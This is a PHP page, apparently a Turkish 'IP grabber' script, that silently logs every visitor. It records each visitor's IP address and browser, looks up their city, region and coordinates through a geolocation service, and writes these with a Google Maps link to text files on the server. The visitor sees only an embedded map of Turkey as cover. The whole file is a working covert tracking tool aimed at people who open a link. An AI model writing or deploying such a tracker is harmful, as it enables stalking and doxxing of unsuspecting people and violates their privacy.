<?php
header('Content-Type: text/html; charset=utf-8');


function GetIP(){
 if(getenv("HTTP_CLIENT_IP")) {
 $ip = getenv("HTTP_CLIENT_IP");
 } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
 $ip = getenv("HTTP_X_FORWARDED_FOR");
 if (strstr($ip, ',')) {
 $tmp = explode (',', $ip);
 $ip = trim($tmp[0]);
 }
 } else {
 $ip = getenv("REMOTE_ADDR");
 }
 return $ip;
}

$ip_adresi = GetIP();
$Geo_Plugin_XML = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip_adresi); 

$adress = $Geo_Plugin_XML->geoplugin_request; 
$ulke = $Geo_Plugin_XML->geoplugin_countryName;
$bolge = $Geo_Plugin_XML->geoplugin_region;
$kita = $Geo_Plugin_XML->geoplugin_continentCode;
$ulkekodu = $Geo_Plugin_XML->geoplugin_countryCode;
$sehir = $Geo_Plugin_XML->geoplugin_city;
$plaka = $Geo_Plugin_XML->geoplugin_regionCode;
$enlem = $Geo_Plugin_XML->geoplugin_latitude;
$boylam = $Geo_Plugin_XML->geoplugin_longitude;
$tarayici = $_SERVER['HTTP_USER_AGENT']; 

$maps = "https://www.google.com/maps/place/".$enlem.",".$boylam."/@".$enlem.",".$boylam.",16z";
$denizark34["0"] = "Ip Adresi : ".$adress;
$denizark34["1"] = "Ulke : ".$ulke; 
$denizark34["2"] = "Bolge : ".$bolge;
$denizark34["3"] = "Kita : ".$kita;
$denizark34["4"] = "Ulke Kodu : ".$ulkekodu;
$denizark34["5"] = "Sehir : ".$sehir;
$denizark34["6"] = "Plaka : ".$plaka;
$denizark34["7"] = "Enlem : ".$enlem;
$denizark34["8"] = "Boylam : ".$boylam;
$denizark34["9"] = "Google Maps : ".$maps;
$denizark34["10"] = "Tarayıcı : ".$tarayici; 


$ac = fopen("yeni-ip.txt","a+");

$veriler = ("-----------FLLEX Code-----------\n".$denizark34["0"]."\n".$denizark34["1"]."\n".$denizark34["2"]."\n".$denizark34["3"]."\n".$denizark34["4"]."\n".$denizark34["5"]."\n".$denizark34["6"]."\n".$denizark34["7"]."\n".$denizark34["8"]."\n".$denizark34["9"]."\n".$denizark34["10"]."\n\n\n");
fwrite($ac,$veriler);
fclose($ac);

$ac = fopen("gecmis-ip.txt","a+");
$veriler = ("-----------FLLEX Code-----------\n".$denizark34["0"]."\n".$denizark34["1"]."\n".$denizark34["2"]."\n".$denizark34["3"]."\n".$denizark34["4"]."\n".$denizark34["5"]."\n".$denizark34["6"]."\n".$denizark34["7"]."\n".$denizark34["8"]."\n".$denizark34["9"]."\n".$denizark34["10"]."\n\n\n");
fwrite($ac,$veriler);
fclose($ac);


$son = fopen("maps.txt","a+");
$mapslink = ($maps);
fwrite($son,$mapslink);
fclose($son);


?>
<center>
<iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d12743676.862055203!2d26.178285126945873!3d38.757987208864336!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x14b0155c964f2671%3A0x40d9dbd42a625f2a!2zVMO8cmtpeWU!5e0!3m2!1str!2str!4v1564660927258!5m2!1str!2str" width="100%" height="100%" frameborder="0" style="border:0" allowfullscreen></iframe></center>